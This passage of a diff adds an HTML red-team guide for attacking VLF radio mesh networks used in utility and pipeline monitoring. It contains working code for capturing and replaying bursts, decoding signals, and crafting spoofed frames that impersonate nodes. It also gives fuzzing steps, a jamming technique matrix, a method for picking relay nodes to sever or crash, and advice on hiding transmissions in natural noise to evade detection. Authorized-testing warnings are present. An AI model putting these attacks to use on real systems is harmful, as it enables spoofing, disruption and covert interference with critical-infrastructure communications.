+        <span class="keyword">for</span> offset <span class="keyword">in</span> range(len(bitstream) - word_len * <span class="number">10</span>):
+            candidate = tuple(bitstream[offset:offset+word_len])
+            count = <span class="number">0</span>
+            pos = offset
+            <span class="keyword">while</span> pos < len(bitstream) - word_len:
+                <span class="keyword">if</span> tuple(bitstream[pos:pos+word_len]) == candidate:
+                    count += <span class="number">1</span>
+                    pos += word_len
+                <span class="keyword">else</span>:
+                    pos += <span class="number">1</span>
+            <span class="keyword">if</span> count > <span class="number">5</span>:
+                key = candidate
+                candidates[key] = candidates.get(key, <span class="number">0</span>) + count
+
+    <span class="comment"># Return top sync word candidates sorted by occurrence</span>
+    <span class="keyword">return</span> sorted(candidates.items(), key=<span class="keyword">lambda</span> x: -x[<span class="number">1</span>])[:<span class="number">10</span>]
+
+<span class="comment"># Load demodulated bitstream</span>
+bits = np.loadtxt(<span class="string">'vlf_symbols.txt'</span>, dtype=int)
+sync_candidates = find_sync_words(bits)
+
+<span class="keyword">for</span> word, count <span class="keyword">in</span> sync_candidates:
+    print(f<span class="string">"Sync candidate: {''.join(map(str,word))} (seen {count}x)"</span>)
+    print(f<span class="string">"  Hex: {int(''.join(map(str,word)),2):0{len(word)//4}X}"</span>)
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">KNOWN VLF PROTOCOLS — QUICK REFERENCE <span class="tag tag-green">REFERENCE</span></div>
+
+        <table class="spec-table">
+          <tr><th>PROTOCOL</th><th>FREQ</th><th>MODULATION</th><th>FRAME FORMAT</th><th>AUTH</th></tr>
+          <tr>
+            <td class="val">STANAG 4285</td>
+            <td>HF/VLF</td>
+            <td>PSK/QAM</td>
+            <td>Known NATO standard</td>
+            <td class="highlight">Varies</td>
+          </tr>
+          <tr>
+            <td class="val">Piccolo Mk2</td>
+            <td>VLF/LF</td>
+            <td>FSK-33 tone</td>
+            <td>Sequential tones</td>
+            <td class="highlight">None</td>
+          </tr>
+          <tr>
+            <td class="val">DECCA</td>
+            <td>70–130 kHz</td>
+            <td>CW</td>
+            <td>Phase comparison</td>
+            <td class="highlight">None</td>
+          </tr>
+          <tr>
+            <td class="val">RTTY / ITA2</td>
+            <td>Any VLF</td>
+            <td>FSK ±170 Hz</td>
+            <td>5-bit Baudot</td>
+            <td class="highlight">None</td>
+          </tr>
+          <tr>
+            <td class="val">Proprietary SCADA</td>
+            <td>14–30 kHz</td>
+            <td>FSK/MSK</td>
+            <td>Custom (reverse engineer)</td>
+            <td class="highlight">Often none</td>
+          </tr>
+          <tr>
+            <td class="val">LoRa-VLF hybrid</td>
+            <td>VLF</td>
+            <td>CSS (chirp)</td>
+            <td>LoRa PHY adapted</td>
+            <td class="highlight">AES-128 (maybe)</td>
+          </tr>
+        </table>
+
+        <div class="info-box">
+          <span class="hl-cyan">INTEL NOTE:</span> Most industrial VLF mesh deployments (power utilities, pipeline monitoring) use proprietary protocols with <strong>no cryptographic authentication</strong>. The cost and complexity of implementing crypto at VLF data rates has historically led vendors to skip it entirely. This is your primary attack surface.
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">REPLAY ATTACK TESTING <span class="tag tag-red">ACTIVE</span></div>
+        <div class="warning">Active phase — requires explicit scope authorization. Any transmission in VLF band may be regulated under FCC Part 15 or equivalent.</div>
+        <div class="code-label">// GNU RADIO PYTHON — CAPTURE THEN REPLAY BURST</div>
+        <div class="code-block">
+<span class="keyword">from</span> gnuradio <span class="keyword">import</span> gr, uhd, blocks
+<span class="keyword">import</span> time
+
+<span class="comment">## CAPTURE PHASE — record target burst to file</span>
+<span class="keyword">class</span> <span class="string">VLFCapture</span>(gr.top_block):
+    <span class="keyword">def</span> <span class="string">__init__</span>(self, filename, freq=<span class="number">15000</span>, duration=<span class="number">10</span>):
+        gr.top_block.__init__(self)
+        self.src = uhd.usrp_source(
+            device_addr=<span class="string">""</span>,
+            stream_args=uhd.stream_args(<span class="string">'fc32'</span>)
+        )
+        self.src.set_center_freq(<span class="number">125000 + freq</span>)  <span class="comment"># with upconverter</span>
+        self.src.set_samp_rate(<span class="number">250000</span>)
+        self.sink = blocks.file_sink(gr.sizeof_gr_complex, filename)
+        self.connect(self.src, self.sink)
+
+<span class="comment">## REPLAY PHASE — retransmit captured burst verbatim</span>
+<span class="keyword">class</span> <span class="string">VLFReplay</span>(gr.top_block):
+    <span class="keyword">def</span> <span class="string">__init__</span>(self, filename, freq=<span class="number">15000</span>):
+        gr.top_block.__init__(self)
+        self.src  = blocks.file_source(gr.sizeof_gr_complex, filename, repeat=<span class="keyword">False</span>)
+        self.sink = uhd.usrp_sink(device_addr=<span class="string">""</span>,
+                                   stream_args=uhd.stream_args(<span class="string">'fc32'</span>))
+        self.sink.set_center_freq(<span class="number">125000 + freq</span>)
+        self.sink.set_samp_rate(<span class="number">250000</span>)
+        self.connect(self.src, self.sink)
+
+<span class="comment"># USAGE: capture → analyze → replay → observe node response</span>
+cap = VLFCapture(<span class="string">'burst_capture.iq'</span>); cap.run()
+time.sleep(<span class="number">2</span>)
+replay = VLFReplay(<span class="string">'burst_capture.iq'</span>); replay.run()
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SECTION 3: HARDWARE ==================== -->
+    <div class="section" id="section-hardware">
+      <div class="page-title">HARDWARE SETUP</div>
+      <div class="page-subtitle">TASK RT-2 // BUILDING YOUR VLF PLATFORM</div>
+
+      <div class="card">
+        <div class="card-title">SDR HARDWARE SELECTION <span class="tag tag-cyan">EQUIPMENT</span></div>
+        <table class="spec-table">
+          <tr><th>DEVICE</th><th>FREQ RANGE</th><th>DYNAMIC RANGE</th><th>TX CAPABLE</th><th>RT RATING</th></tr>
+          <tr>
+            <td class="val">RTL-SDR v3</td>
+            <td>500 kHz–1.7 GHz</td>
+            <td>~50 dB</td>
+            <td class="hl-red">NO</td>
+            <td>Passive recon only ⭐⭐</td>
+          </tr>
+          <tr>
+            <td class="val">KiwiSDR</td>
+            <td>0–30 MHz native</td>
+            <td>~100 dB</td>
+            <td class="hl-red">NO</td>
+            <td>Best passive VLF ⭐⭐⭐⭐⭐</td>
+          </tr>
+          <tr>
+            <td class="val">Perseus SDR</td>
+            <td>0–40 MHz</td>
+            <td>~120 dB</td>
+            <td class="hl-red">NO</td>
+            <td>Lab-grade passive ⭐⭐⭐⭐⭐</td>
+          </tr>
+          <tr>
+            <td class="val">HackRF One</td>
+            <td>1 MHz–6 GHz</td>
+            <td>~40 dB</td>
+            <td class="hl-green">YES (half-duplex)</td>
+            <td>Active ops ⭐⭐⭐</td>
+          </tr>
+          <tr>
+            <td class="val">USRP B210</td>
+            <td>70 MHz–6 GHz</td>
+            <td>~70 dB</td>
+            <td class="hl-green">YES (full-duplex)</td>
+            <td>Pro active ops ⭐⭐⭐⭐⭐</td>
+          </tr>
+          <tr>
+            <td class="val">LimeSDR</td>
+            <td>100 kHz–3.8 GHz</td>
+            <td>~60 dB</td>
+            <td class="hl-green">YES (full-duplex)</td>
+            <td>Budget active ⭐⭐⭐⭐</td>
+          </tr>
+        </table>
+        <div class="info-box"><span class="hl-cyan">RECOMMENDED STACK:</span> KiwiSDR for passive recon + USRP B210 with VLF upconverter/downconverter for active testing. Keep them on separate physical systems.</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">VLF ANTENNA DESIGNS <span class="tag tag-green">BUILD</span></div>
+        <p>Antenna performance is everything at VLF. The wavelengths are enormous (10–100 km), so every antenna is electrically short. Here are your practical options:</p>
+
+        <h3>MAGNETIC LOOP (RECOMMENDED FOR RECON)</h3>
+        <p>A 1–3 meter diameter shielded loop provides excellent noise rejection and reasonable sensitivity. Wind 5–20 turns of wire on a PVC or wood frame. Connect to a low-noise preamp before the SDR.</p>
+        <div class="code-label">// LOOP ANTENNA SPECIFICATIONS</div>
+        <div class="code-block">
+Diameter:      <span class="number">2.0</span> m
+Turns:         <span class="number">10</span>
+Wire gauge:    <span class="number">18</span> AWG
+Inductance:    ~<span class="number">180</span> μH  (measured with LCR meter)
+Resonant cap:  C = <span class="number">1</span> / ((<span class="number">2π</span>·f)² · L)
+               @ <span class="number">15 kHz</span>: C = <span class="number">1</span>/((94247)² · <span class="number">180e-6</span>) ≈ <span class="number">627 pF</span>
+
+Preamp:        OPA627 or LT1028 based, gain +30 dB
+               Input impedance: <span class="number">10</span> MΩ balanced
+               Noise figure:    <span class="number">&lt;2 nV/√Hz</span>
+        </div>
+
+        <h3>E-FIELD VERTICAL (LONG WIRE)</h3>
+        <p>Deploy 30–100m of wire horizontally or as an inverted-L. Higher noise pickup than loop but captures signals from all directions. Requires good ground counterpoise.</p>
+
+        <div class="code-label">// QUICK SNR ESTIMATE FOR LONG WIRE</div>
+        <div class="code-block">
+<span class="comment"># Effective height of short monopole at VLF</span>
+h_eff = wire_length / <span class="number">2</span>           <span class="comment"># meters (electrical short antenna)</span>
+received_V = E_field_Vm * h_eff   <span class="comment"># voltage at antenna terminals</span>
+                                   <span class="comment"># typical VLF: E = 0.1–10 mV/m</span>
+
+<span class="comment"># Thermal noise floor in 100 Hz bandwidth</span>
+k = <span class="number">1.38e-23</span>     <span class="comment"># Boltzmann</span>
+T = <span class="number">290</span>           <span class="comment"># Kelvin</span>
+BW = <span class="number">100</span>          <span class="comment"># Hz</span>
+R = <span class="number">50</span>            <span class="comment"># Ohm termination</span>
+noise_V = (k * T * BW * R)**<span class="number">0.5</span>   <span class="comment"># ≈ 9 nV in 100 Hz BW</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SECTION 4: GNU RADIO ==================== -->
+    <div class="section" id="section-gnuradio">
+      <div class="page-title">GNU RADIO // VLF PIPELINE</div>
+      <div class="page-subtitle">TASK RT-10 THROUGH RT-12 // SIGNAL PROCESSING CHAIN</div>
+
+      <div class="card">
+        <div class="card-title">COMPLETE VLF DECODE FLOWGRAPH <span class="tag tag-cyan">GNU RADIO</span></div>
+        <p>This Python-based GNU Radio flowgraph implements a complete VLF receive and decode chain. Build this before any field deployment.</p>
+        <div class="code-label">// vlf_mesh_decoder.py — COMPLETE FLOWGRAPH</div>
+        <div class="code-block">
+<span class="keyword">#!/usr/bin/env python3</span>
+<span class="comment">"""VLF Mesh Network Decoder — Red Team Field Tool"""</span>
+<span class="keyword">from</span> gnuradio <span class="keyword">import</span> gr, blocks, filter, analog, digital
+<span class="keyword">from</span> gnuradio.filter <span class="keyword">import</span> firdes
+<span class="keyword">import</span> numpy <span class="keyword">as</span> np
+
+<span class="keyword">class</span> <span class="string">VLFMeshDecoder</span>(gr.top_block):
+    <span class="keyword">def</span> <span class="string">__init__</span>(self,
+                 center_freq=<span class="number">125000</span>,    <span class="comment"># Hz (with upconverter)</span>
+                 samp_rate=<span class="number">250000</span>,      <span class="comment"># samples/sec</span>
+                 target_freq=<span class="number">15000</span>,     <span class="comment"># target VLF channel</span>
+                 symbol_rate=<span class="number">100</span>,       <span class="comment"># baud — measure first!</span>
+                 output_file=<span class="string">'decoded.bin'</span>):
+
+        gr.top_block.__init__(self, <span class="string">"VLF Mesh Decoder"</span>)
+
+        <span class="comment">## ── SOURCE: RTL-SDR via osmosdr ──────────────────</span>
+        <span class="keyword">import</span> osmosdr
+        self.src = osmosdr.source(args=<span class="string">"numchan=1 rtl=0"</span>)
+        self.src.set_sample_rate(samp_rate)
+        self.src.set_center_freq(center_freq)
+        self.src.set_gain(<span class="number">40</span>)
+        self.src.set_if_gain(<span class="number">32</span>)
+
+        <span class="comment">## ── TRANSLATE: tune to target VLF channel ────────</span>
+        offset = target_freq - center_freq   <span class="comment"># freq offset to channel</span>
+        self.xlate = filter.freq_xlating_fir_filter_ccf(
+            decimation=<span class="number">5</span>,
+            taps=firdes.low_pass(<span class="number">1</span>, samp_rate, <span class="number">2000</span>, <span class="number">500</span>),
+            center_freq=offset,
+            sampling_freq=samp_rate
+        )
+        <span class="comment"># New rate after decimation: 250000/5 = 50000 Hz</span>
+
+        <span class="comment">## ── NOTCH FILTER: kill 50/60 Hz power line noise ─</span>
+        self.notch_50  = filter.iir_filter_ccz(
+            <span class="comment"># 50 Hz and harmonics notch coefficients</span>
+            fwd_taps=self._notch_coeffs(<span class="number">50</span>, <span class="number">50000</span>),
+            rev_taps=[]
+        )
+
+        <span class="comment">## ── AGC: normalize signal amplitude ──────────────</span>
+        self.agc = analog.agc_cc(
+            rate=<span class="number">1e-3</span>,
+            reference=<span class="number">1.0</span>,
+            gain=<span class="number">1.0</span>
+        )
+
+        <span class="comment">## ── DEMODULATE: FSK/BPSK — select based on analysis</span>
+        sps = int(<span class="number">50000</span> / symbol_rate)  <span class="comment"># samples per symbol</span>
+        self.clock_rec = digital.clock_recovery_mm_cc(
+            omega=float(sps),
+            gain_omega=<span class="number">0.001</span>,
+            mu=<span class="number">0.5</span>,
+            gain_mu=<span class="number">0.05</span>,
+            omega_relative_limit=<span class="number">0.005</span>
+        )
+
+        <span class="comment">## ── DECISION: hard symbol decisions ──────────────</span>
+        self.slicer = digital.binary_slicer_fb()
+
+        <span class="comment">## ── SINK: save decoded bits ──────────────────────</span>
+        self.file_sink = blocks.file_sink(
+            gr.sizeof_char, output_file
+        )
+
+        <span class="comment">## ── CONNECT CHAIN ────────────────────────────────</span>
+        self.connect(
+            self.src,
+            self.xlate,
+            self.agc,
+            self.clock_rec,
+            self.slicer,
+            self.file_sink
+        )
+
+<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
+    decoder = VLFMeshDecoder(target_freq=<span class="number">15200</span>, symbol_rate=<span class="number">75</span>)
+    decoder.run()
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">UNIVERSAL RADIO HACKER — WORKFLOW <span class="tag tag-amber">URH</span></div>
+        <div class="steps">
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>LOAD IQ FILE</h4>
+              <p>File → Open Signal → select your .iq capture. Set sample rate to 250000 Hz. URH will display the spectrogram automatically.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>AUTO-DETECT MODULATION</h4>
+              <p>Analysis tab → Autodetect Parameters. URH will estimate modulation type, baud rate, and bit length. Verify against your waterfall observations.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>LABEL MESSAGES</h4>
+              <p>URH automatically segments bursts into "messages." Label each type. Look for consistent message lengths (fixed-length frames are common in VLF mesh).</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>PROTOCOL ANALYSIS</h4>
+              <p>Analysis → Protocol Analyzer. URH highlights fields that change across messages (likely: sequence numbers, addresses, payload) vs fields that stay constant (sync words, command bytes, CRC polynomials).</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>FUZZING</h4>
+              <p>Generator tab → Fuzzing. Select field to fuzz → set range → send via connected SDR. Monitor target node response for crashes, resets, or behavioral changes.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SECTION 5: INJECTION ==================== -->
+    <div class="section" id="section-injection">
+      <div class="page-title">INJECTION & SPOOFING</div>
+      <div class="page-subtitle">TASK RT-28 THROUGH RT-36 // ACTIVE EXPLOITATION PHASE</div>
+
+      <div class="warning">ALL ACTIVE TRANSMISSION OPERATIONS REQUIRE EXPLICIT WRITTEN AUTHORIZATION FROM ASSET OWNER AND APPLICABLE SPECTRUM AUTHORITY. VLF BAND TRANSMISSIONS ARE TIGHTLY REGULATED. UNAUTHORIZED TX IS A FEDERAL OFFENSE (47 U.S.C. § 333).</div>
+
+      <div class="card">
+        <div class="card-title">ATTACK CHAIN — NODE IMPERSONATION <span class="tag tag-red">ACTIVE</span></div>
+        <div class="attack-chain">
+          <div class="attack-step">
+            <div class="attack-step-connector"><div class="circle"></div><div class="line"></div></div>
+            <div class="attack-step-body">
+              <h4>PHASE 1 // PASSIVE CAPTURE</h4>
+              <p>Capture 100+ valid packets from target node. Extract: node address, sync pattern, CRC algorithm, sequence number behavior.</p>
+              <code>Duration: 24–72 hrs passive monitoring</code>
+            </div>
+          </div>
+          <div class="attack-step">
+            <div class="attack-step-connector"><div class="circle"></div><div class="line"></div></div>
+            <div class="attack-step-body">
+              <h4>PHASE 2 // PROTOCOL RECONSTRUCTION</h4>
+              <p>Rebuild the packet structure. Verify CRC polynomial. Confirm sequence number increments (linear? random? timestamp-based?). Identify command bytes vs status bytes.</p>
+              <code>Tools: URH, scapy (custom layer), Python</code>
+            </div>
+          </div>
+          <div class="attack-step">
+            <div class="attack-step-connector"><div class="circle"></div><div class="line"></div></div>
+            <div class="attack-step-body">
+              <h4>PHASE 3 // PACKET CRAFTING</h4>
+              <p>Construct target packet with spoofed source address, correct sequence number, valid CRC. If no auth — this is sufficient. If weak auth — proceed to Phase 3b.</p>
+              <code>Payload: command byte targeting downstream node action</code>
+            </div>
+          </div>
+          <div class="attack-step">
+            <div class="attack-step-connector"><div class="circle"></div><div class="line"></div></div>
+            <div class="attack-step-body">
+              <h4>PHASE 4 // TRANSMISSION TIMING</h4>
+              <p>Transmit during expected node TX window (avoids collision). If mesh has TDMA slots, inject within the target node's assigned slot to appear as legitimate traffic.</p>
+              <code>Timing precision: ±1 ms relative to slot boundary</code>
+            </div>
+          </div>
+          <div class="attack-step">
+            <div class="attack-step-connector"><div class="circle"></div><div class="line"></div></div>
+            <div class="attack-step-body">
+              <h4>PHASE 5 // OBSERVE & ITERATE</h4>
+              <p>Monitor downstream node responses. Did the network accept the packet? Did a downstream node change state? Document and iterate with modified command bytes.</p>
+              <code>Success indicators: ACK packet from target, state change observed</code>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">PACKET CRAFTER — PYTHON SCAPY LAYER <span class="tag tag-amber">CODE</span></div>
+        <div class="code-label">// CUSTOM SCAPY LAYER FOR VLF MESH PROTOCOL</div>
+        <div class="code-block">
+<span class="keyword">from</span> scapy.packet <span class="keyword">import</span> Packet
+<span class="keyword">from</span> scapy.fields <span class="keyword">import</span> *
+<span class="keyword">import</span> struct, binascii
+
+<span class="comment"># Define protocol structure from reverse engineering</span>
+<span class="keyword">class</span> <span class="string">VLFMeshFrame</span>(Packet):
+    name = <span class="string">"VLFMeshFrame"</span>
+    fields_desc = [
+        XByteField(<span class="string">"sync1"</span>, <span class="number">0xAA</span>),        <span class="comment"># sync word byte 1</span>
+        XByteField(<span class="string">"sync2"</span>, <span class="number">0x55</span>),        <span class="comment"># sync word byte 2</span>
+        XByteField(<span class="string">"src_addr"</span>, <span class="number">0x00</span>),     <span class="comment"># source node ID</span>
+        XByteField(<span class="string">"dst_addr"</span>, <span class="number">0xFF</span>),     <span class="comment"># dest (0xFF = broadcast)</span>
+        ShortField(<span class="string">"seq_num"</span>, <span class="number">0</span>),         <span class="comment"># sequence number</span>
+        ByteField(<span class="string">"cmd"</span>, <span class="number">0x01</span>),           <span class="comment"># command byte</span>
+        FieldLenField(<span class="string">"payload_len"</span>, None,
+                      length_of=<span class="string">"payload"</span>),
+        StrLenField(<span class="string">"payload"</span>, b<span class="string">""</span>,
+                    length_from=<span class="keyword">lambda</span> p: p.payload_len),
+        XShortField(<span class="string">"crc16"</span>, <span class="number">0x0000</span>),     <span class="comment"># CRC-16/CCITT</span>
+    ]
+
+    <span class="keyword">def</span> <span class="string">compute_crc</span>(self):
+        <span class="comment">"""Compute CRC-16/CCITT over frame (excl. CRC field)"""</span>
+        raw = bytes(self)[:-<span class="number">2</span>]              <span class="comment"># everything except CRC</span>
+        crc = <span class="number">0xFFFF</span>
+        <span class="keyword">for</span> byte <span class="keyword">in</span> raw:
+            crc ^= byte << <span class="number">8</span>
+            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">8</span>):
+                crc = (crc << <span class="number">1</span>) ^ <span class="number">0x1021</span> <span class="keyword">if</span> crc & <span class="number">0x8000</span> <span class="keyword">else</span> crc << <span class="number">1</span>
+        <span class="keyword">return</span> crc & <span class="number">0xFFFF</span>
+
+<span class="comment"># Craft spoofed packet as node 0x03 commanding node 0x07</span>
+pkt = VLFMeshFrame(
+    src_addr=<span class="number">0x03</span>,     <span class="comment"># impersonate node 3</span>
+    dst_addr=<span class="number">0x07</span>,     <span class="comment"># target node 7</span>
+    seq_num=<span class="number">0x00A2</span>,    <span class="comment"># next expected seq (from capture)</span>
+    cmd=<span class="number">0x05</span>,          <span class="comment"># e.g., 0x05 = STATUS_REQUEST</span>
+    payload=b<span class="string">'\x00'</span>
+)
+pkt.crc16 = pkt.compute_crc()
+raw_frame = bytes(pkt)
+print(<span class="string">f"Crafted frame ({len(raw_frame)} bytes): {raw_frame.hex()}"</span>)
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SECTION 6: INTERFERENCE ==================== -->
+    <div class="section" id="section-interference">
+      <div class="page-title">INTERFERENCE OPS</div>
+      <div class="page-subtitle">TASK RT-19 THROUGH RT-27 // RESILIENCE ASSESSMENT</div>
+
+      <div class="warning">JAMMING TESTS MUST BE CONDUCTED IN A SHIELDED ENVIRONMENT (FARADAY CAGE / RF-SCREENED TEST LAB) OR IN EXPLICIT COORDINATION WITH THE ASSET OWNER AND SPECTRUM AUTHORITY. JAMMING A COMMUNICATION SYSTEM IS ILLEGAL UNDER 47 CFR § 333 AND EQUIVALENT INTERNATIONAL REGULATIONS.</div>
+
+      <div class="card">
+        <div class="card-title">JAMMING EFFECTIVENESS MATRIX <span class="tag tag-red">ASSESSMENT</span></div>
+        <table class="spec-table">
+          <tr><th>TECHNIQUE</th><th>MECHANISM</th><th>EFFECTIVE AGAINST</th><th>MESH RESPONSE</th><th>DETECTABILITY</th></tr>
+          <tr>
+            <td class="val">Spot Jamming</td>
+            <td>CW on exact channel</td>
+            <td>Fixed-freq nodes</td>
+            <td>Reroute if capable</td>
+            <td class="hl-red">HIGH</td>
+          </tr>
+          <tr>
+            <td class="val">Swept Jamming</td>
+            <td>Scan across band</td>
+            <td>Multi-channel mesh</td>
+            <td>Protocol-dependent</td>
+            <td class="hl-amber">MEDIUM</td>
+          </tr>
+          <tr>
+            <td class="val">Barrage</td>
+            <td>Wideband noise</td>
+            <td>Any VLF in range</td>
+            <td>Full disruption</td>
+            <td class="hl-red">VERY HIGH</td>
+          </tr>
+          <tr>
+            <td class="val">Reactive</td>
+            <td>Respond to detected TX</td>
+            <td>Burst protocols</td>
+            <td>Unpredictable</td>
+            <td class="hl-amber">MEDIUM</td>
+          </tr>
+          <tr>
+            <td class="val">Smart/Selective</td>
+            <td>Corrupt specific bits</td>
+            <td>Weak CRC schemes</td>
+            <td>Silent drop/retry</td>
+            <td class="hl-green">LOW</td>
+          </tr>
+          <tr>
+            <td class="val">Deceptive</td>
+            <td>Inject plausible noise</td>
+            <td>Network layer</td>
+            <td>Routing confusion</td>
+            <td class="hl-green">LOWEST</td>
+          </tr>
+        </table>
+      </div>
+
+      <div class="card">
+        <div class="card-title">MESH PARTITIONING ATTACK <span class="tag tag-red">ADVANCED</span></div>
+        <p>Rather than brute-force jamming, a surgical partitioning attack severs the mesh between two segments by targeting only the relay node(s) connecting them. This is more effective, stealthier, and reveals architectural weaknesses.</p>
+
+        <div class="code-label">// MESH TOPOLOGY INFERENCE FROM PASSIVE OBSERVATION</div>
+        <div class="code-block">
+<span class="keyword">import</span> networkx <span class="keyword">as</span> nx
+<span class="keyword">import</span> json
+<span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict
+
+<span class="comment"># Build mesh topology graph from captured packet routing headers</span>
+G = nx.DiGraph()
+
+<span class="comment"># Load parsed packet log (from URH/GNU Radio decoder output)</span>
+<span class="keyword">with</span> open(<span class="string">'packet_log.jsonl'</span>) <span class="keyword">as</span> f:
+    packets = [json.loads(l) <span class="keyword">for</span> l <span class="keyword">in</span> f]
+
+<span class="keyword">for</span> pkt <span class="keyword">in</span> packets:
+    src = pkt[<span class="string">'src_addr'</span>]
+    dst = pkt[<span class="string">'dst_addr'</span>]
+    <span class="keyword">if</span> dst != <span class="number">0xFF</span>:  <span class="comment"># ignore broadcasts</span>
+        G.add_edge(src, dst, weight=G.get_edge_data(src,dst,{}).get(<span class="string">'weight'</span>,<span class="number">0</span>)+<span class="number">1</span>)
+
+<span class="comment"># Find critical relay nodes (high betweenness = partition target)</span>
+betweenness = nx.betweenness_centrality(G, weight=<span class="string">'weight'</span>)
+sorted_nodes = sorted(betweenness.items(), key=<span class="keyword">lambda</span> x: -x[<span class="number">1</span>])
+
+print(<span class="string">"PARTITION TARGETS (by betweenness centrality):"</span>)
+<span class="keyword">for</span> node, score <span class="keyword">in</span> sorted_nodes[:5]:
+    print(f<span class="string">"  Node 0x{node:02X}: centrality={score:.4f}"</span>)
+
+<span class="comment"># Simulate partition: remove top node and check connectivity</span>
+top_target = sorted_nodes[<span class="number">0</span>][<span class="number">0</span>]
+G_severed = G.copy()
+G_severed.remove_node(top_target)
+components = list(nx.weakly_connected_components(G_severed))
+print(f<span class="string">"\nRemoving node 0x{top_target:02X} creates {len(components)} isolated segments"</span>)
+        </div>
+
+        <div class="info-box">
+          <span class="hl-amber">TACTICAL NOTE:</span> In a real engagement, once you identify the critical relay node via topology analysis, you have three options: (1) physical disruption of the node hardware, (2) targeted RF denial against that node's frequency/slot only, or (3) protocol-level attack to crash the node's firmware via malformed packets.
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">RESILIENCE MEASUREMENT <span class="tag tag-green">METRICS</span></div>
+        <div class="code-label">// AUTOMATED RESILIENCE TEST — MEASURE RECOVERY TIME</div>
+        <div class="code-block">
+<span class="keyword">import</span> time, threading
+<span class="keyword">import</span> numpy <span class="keyword">as</span> np
+
+<span class="keyword">class</span> <span class="string">ResilienceTest</span>:
+    <span class="keyword">def</span> <span class="string">__init__</span>(self, monitor, jammer):
+        self.monitor = monitor     <span class="comment"># passive SDR listener</span>
+        self.jammer  = jammer      <span class="comment"># active TX (authorized lab only)</span>
+        self.results = []
+
+    <span class="keyword">def</span> <span class="string">run_test</span>(self, jam_duration_s=<span class="number">5</span>, trials=<span class="number">10</span>):
+        <span class="keyword">for</span> trial <span class="keyword">in</span> range(trials):
+            <span class="comment"># Wait for baseline TX — confirm network active</span>
+            self.monitor.wait_for_packet(timeout=<span class="number">30</span>)
+
+            <span class="comment"># Start jamming</span>
+            t_jam_start = time.time()
+            self.jammer.start(duration=jam_duration_s)
+
+            <span class="comment"># Wait for network to resume post-jam</span>
+            t_resume = self.monitor.wait_for_packet(timeout=<span class="number">120</span>)
+            recovery_time = t_resume - (t_jam_start + jam_duration_s)
+
+            self.results.append({
+                <span class="string">'trial'</span>: trial,
+                <span class="string">'recovery_s'</span>: recovery_time,
+                <span class="string">'resumed'</span>: t_resume <span class="keyword">is not</span> <span class="keyword">None</span>
+            })
+            time.sleep(<span class="number">30</span>)   <span class="comment"># cooldown between trials</span>
+
+        recovered = [r <span class="keyword">for</span> r <span class="keyword">in</span> self.results <span class="keyword">if</span> r[<span class="string">'resumed'</span>]]
+        print(f<span class="string">"Recovery rate: {len(recovered)}/{trials}"</span>)
+        print(f<span class="string">"Mean recovery time: {np.mean([r['recovery_s'] for r in recovered]):.1f}s"</span>)
+        print(f<span class="string">"Max recovery time:  {np.max([r['recovery_s'] for r in recovered]):.1f}s"</span>)
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SECTION 7: OPSEC ==================== -->
+    <div class="section" id="section-opsec">
+      <div class="page-title">OPSEC // RF SIGNATURE CONTROL</div>
+      <div class="page-subtitle">STAYING GHOST WHILE YOU WORK</div>
+
+      <div class="card">
+        <div class="card-title">RF EMISSIONS DISCIPLINE <span class="tag tag-red">CRITICAL</span></div>
+        <p>Your SDR and any active TX equipment emit unintentional signals — local oscillator leakage, USB switching noise, power supply harmonics. At VLF, even passive equipment can be detected.</p>
+
+        <table class="spec-table">
+          <tr><th>EMISSION SOURCE</th><th>FREQUENCY</th><th>MITIGATION</th></tr>
+          <tr>
+            <td>SDR local oscillator</td>
+            <td class="val">Center freq ±harmonics</td>
+            <td>Shield SDR, use ferrite chokes on USB</td>
+          </tr>
+          <tr>
+            <td>USB 3.0 interference</td>
+            <td class="val">~2.4 GHz + VLF harmonics</td>
+            <td>Use USB 2.0 only, shielded cables</td>
+          </tr>
+          <tr>
+            <td>Laptop switching PSU</td>
+            <td class="val">100 kHz–1 MHz harmonics</td>
+            <td>Run on battery, add line filter</td>
+          </tr>
+          <tr>
+            <td>HDMI / display cable</td>
+            <td class="val">27–54 MHz + harmonics</td>
+            <td>Disable display, use SSH, shielded cables</td>
+          </tr>
+          <tr>
+            <td>GNU Radio CPU load</td>
+            <td class="val">Processor clock harmonics</td>
+            <td>Faraday box around compute hardware</td>
+          </tr>
+        </table>
+      </div>
+
+      <div class="card">
+        <div class="card-title">DETECTION EVASION — ACTIVE PHASE <span class="tag tag-amber">OPSEC</span></div>
+
+        <div class="steps">
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>MIMIC NATURAL INTERFERENCE</h4>
+              <p>VLF is plagued by natural noise: lightning (sferics), power line harmonics, solar activity. Structure your test transmissions to blend with these. Short bursts during thunderstorm activity are nearly impossible to distinguish from natural noise at the receiver side.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>POWER MANAGEMENT</h4>
+              <p>Use the minimum power required to reach your target. VLF propagates extremely well — you almost certainly need far less power than you think. Over-powering is the #1 way to get detected. Measure path loss first, then set TX power 3 dB above minimum decode threshold.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>TIMING DISCIPLINE</h4>
